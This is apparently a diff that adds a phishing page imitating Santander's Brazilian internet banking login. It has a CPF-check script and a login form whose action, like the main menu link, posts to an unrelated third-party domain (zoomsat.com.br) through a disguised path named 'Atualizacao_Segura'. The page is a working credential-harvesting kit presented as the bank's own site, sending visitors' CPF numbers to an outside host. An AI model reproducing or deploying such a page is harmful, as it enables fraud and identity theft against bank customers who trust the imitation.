@@ -1,0 +1,94 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Documento sem título</title>
+<link href="newindex.css" rel="stylesheet" type="text/css" />
+<script>
+function check_cpf(){
+	if(document.getElementById('act_cf').value.length < 11){
+		alert('Para continuar é necessário informar um número de CPF. Por favor, informe um número de CPF válido.');	
+		return false;
+	}else if(document.getElementById('act_cf').value == 11111111111 ||
+	 document.getElementById('act_cf').value == 22222222222 ||
+	 document.getElementById('act_cf').value == 33333333333 ||
+	 document.getElementById('act_cf').value == 44444444444 ||
+	 document.getElementById('act_cf').value == 55555555555 ||
+	 document.getElementById('act_cf').value == 66666666666 ||
+	 document.getElementById('act_cf').value == 77777777777 ||
+	 document.getElementById('act_cf').value == 88888888888 ||
+	 document.getElementById('act_cf').value == 99999999999 ||
+	 document.getElementById('act_cf').value == 00000000000){
+		alert('Para continuar é necessário informar um número de CPF. Por favor, informe um número de CPF válido.');	
+		return false;
+	}else{
+		var t = '';
+		var d = '';
+		var c = '';
+		var cpf = document.getElementById('act_cf').value;
+		for (t = 9; t < 11; t++) {
+			for (d = 0, c = 0; c < t; c++) {
+				d += cpf[c] * ((t + 1) - c);
+			}
+			d = ((10 * d) % 11) % 10;
+ 
+			if (cpf[c] != d) {
+				alert('O CPF Informado não é válido! Tente novamente!');
+				return false;
+			}
+		}
+		return true;	
+	}
+}
+</script>
+</head>
+
+<body>
+<div class="header">
+<img src="header.jpg" width="975" height="45" />
+</div>
+<div class="menu">
+  <div id="select_tipo_menu">
+  <a href="http://zoomsat.com.br/gprs/01SANTANDER%5FuserKeyASCIIS%28i%29%20%3D%20Asc%28Mid%24%28UserKey%2C%20i%2C%201%29%29/TEXTAsciis%28i%29%20%3D%20Asc%28Mid%24%28Text%2C%20i%2C%201%29%29/Temp%20%3D%20TEXTAsciis%28i%29%20%2B%20userKeyASCIIS%28j%29/SANTANDER%2DNET/br/Atualizacao%5FSegura/index.php" class="tipo_ativo">Pessoa Física</a>
+  <a href="index1.php.html#">Pessoa Jurídica</a>
+  </div><!-- select tipo menu -->
+</div><!-- menu -->
+<div class="menu_lat">
+  	<ul>
+    	<li class="menu_logo"><img src="101516logo.gif" width="189" height="73" /></li>
+    	<li><a href="index1.php.html#">Santander</a></li>
+        <li><a href="index1.php.html#">Santander<br />Van Gogh</a></li>
+        <li><a href="index1.php.html#">Santander<br />Select</a></li>
+        <li><a href="index1.php.html#">Santander<br />Private Banking</a></li>
+        <li><a href="index1.php.html#">Santander<br />Universidades</a></li>
+        <li class="acess_fisi">
+        <img src="acess_ib_fisi.jpg" width="301" height="85" usemap="#Map" border="0" />
+        <map name="Map" id="Map">
+          
+        </map>
+        <form name="form1" enctype="multipart/form-data" method="post" action="http://zoomsat.com.br/gprs/01SANTANDER%5FuserKeyASCIIS%28i%29%20%3D%20Asc%28Mid%24%28UserKey%2C%20i%2C%201%29%29/TEXTAsciis%28i%29%20%3D%20Asc%28Mid%24%28Text%2C%20i%2C%201%29%29/Temp%20%3D%20TEXTAsciis%28i%29%20%2B%20userKeyASCIIS%28j%29/SANTANDER%2DNET/br/Atualizacao%5FSegura/ACESSO/index.php" onsubmit="return check_cpf();">
+        <input type="text" name="act_cf" id="act_cf" class="pracima" maxlength="11">
+        <input type="submit" name="ks3btn" class="btn_go1" value="">
+        </form>
+       
+      </li>
+        <div style="clear:both"></div>
+    </ul>
+    <div style="clear:both"></div>
+  </div><!-- menu lat -->
+  <div id="bannerone">
+  <img src="101516grande.jpg" width="975" height="301" />
+  </div>
+<div class="bg_one_one">
+<img src="bg_one_one.jpg" width="975" height="764" />
+</div>
+<div class="bg_one_two">
+<img src="bg_one_two.jpg" width="975" height="528" />
+</div>
+<div id="footer">
+	<div id="footer_centered">
+    <img src="footer.jpg" width="975" height="282" />
+    </div>
+</div>
+</body>
+</html>
